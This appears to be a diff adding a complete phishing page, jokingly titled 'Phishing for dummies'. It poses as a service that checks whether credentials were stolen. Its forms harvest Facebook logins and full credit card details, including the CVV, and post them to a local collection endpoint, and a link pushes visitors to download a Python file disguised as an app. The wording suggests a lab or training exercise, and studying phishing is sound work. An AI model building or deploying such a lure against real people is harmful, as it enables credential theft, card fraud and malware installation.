@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+* {
+  box-sizing: border-box;
+}
+
+/* Create two equal columns that floats next to each other */
+.column {
+  float: left;
+  width: 50%;
+  padding: 10px;
+  height: 400px; /* Should be removed. Only for demonstration */
+}
+
+/* Clear floats after the columns */
+.row:after {
+  content: "";
+  display: table;
+  clear: both;
+}
+</style>
+</head>
+
+<title>Phishing for dummies</title>
+<body style="background-color:#c4e4f5">
+
+<div style="text-align: center">
+	<h2>Web Trust-me Fabric (WTF) presents:</h2>
+	<h3>Check here if your credentials was stolen</h3>
+</div>
+<div class="row">
+  <div class="column" style="background-color:#03cffc;">
+    <img src="facebook.jpg">
+    <p>Enter your credentials here to "safely" check</p>
+	<div id="header_wrapper">
+        <div id="header">
+            <form action = 'http://127.0.0.1:1337/htmltest1' method = "post">
+			<ul>
+                <li>Email or Phone<br><input type="text" name="email"></li>
+                <li>Password<br><input type="password" name="password"><br></li><br>
+                <input type="hidden" name="btn_identifier" value="Login" />
+                <li><input type="submit" name="Login" value="Login"></li>
+			</ul>
+            </form>
+        </div>
+    </div>
+  </div>
+  <div class="column" style="background-color:#de3737;">
+    <img src="cc.jpg">
+    <p>Enter your credit card here to "safely" check</p>
+	<div id="header_wrapper">
+        <div id="header">
+            <form action = 'http://127.0.0.1:1337/htmltest1' method = "post">
+			<ul>
+                <li>Owner<br><input type="text" name="owner"></li>
+                <li>Card Number<br><input type="text" name="card_num"><br></li>
+				<li>Expiration Date<br><input type="date" name="edate"></li>
+				<li>CVV<br><input type="text" name="cvv"></li>
+                <input type="hidden" name="btn_identifier" value="Check" />
+                <li><input type="submit" name="Check" value="Check"></li>
+			</ul>
+            </form>
+        </div>
+    </div>
+  </div>
+</div>
+<br><br>
+<div style="text-align: center">
+    <a href="little_bird.py" class="button large hpbottom">or Download our app to always be updated</a>
+</div>
+
+</body>
+
+
+</html>
